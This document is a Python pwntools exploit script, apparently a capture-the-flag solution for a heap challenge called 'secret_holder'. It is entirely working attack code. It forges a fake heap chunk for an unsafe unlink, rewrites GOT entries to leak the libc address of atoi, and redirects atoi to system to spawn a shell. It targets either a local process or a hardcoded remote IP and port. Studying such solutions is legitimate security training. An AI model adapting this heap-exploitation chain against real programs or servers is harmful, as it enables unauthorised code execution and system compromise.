from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process(["./ld.so.2","./secret_holder"],env = {"LD_PRELOAD":"./libc64-2.19.so"})
	libc = ELF("./libc64-2.19.so")
	elf = ELF("./secret_holder")
else:
	p = remote("111.198.29.45","59448")
	libc = ELF("./libc64-2.19.so")
	elf = ELF("./secret_holder")

def menu(choice):
	p.sendafter("3. Renew secret\n",str(choice))

def add(type_,content):
	menu(1)
	p.sendafter("3. Huge secret\n",str(type_))
	p.sendafter("Tell me your secret: \n",content)

def edit(type_,content):
	menu(3)
	p.sendafter("3. Huge secret\n",str(type_))
	p.sendafter("Tell me your secret: \n",content)

def free(type_):
	menu(2)
	p.sendafter("3. Huge secret\n",str(type_))

def debugf():
	if debug:
		gdb.attach(p,"b *0x400D15")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
debugf()
target = 0x6020B0
payload = p64(0) + p64(0x21) + p64(target - 0x18) + p64(target - 0x10) + p64(0x20)
add(1,payload)
add(2,"b")
free(1)
add(3,"c")
free(1)
target = 0x6020B0
payload = p64(0) + p64(0x21) + p64(target - 0x18) + p64(target - 0x10) + p64(0x20)
add(1,payload)
free(2)
payload = p64(0) + p64(elf.got["free"]) + p64(elf.got["atoi"]) * 2 + p64(0x0000000100000001)
edit(1,payload)
edit(2,p64(elf.plt["puts"]))
free(1)
leak_addr = u64(p.recvuntil("\n",drop = True).ljust(8,"\x00"))
libc.address = leak_addr - libc.symbols["atoi"]
log.success("libc_base:" + hex(libc.address))
edit(3,p64(libc.symbols["system"]))
menu("sh")
p.interactive()
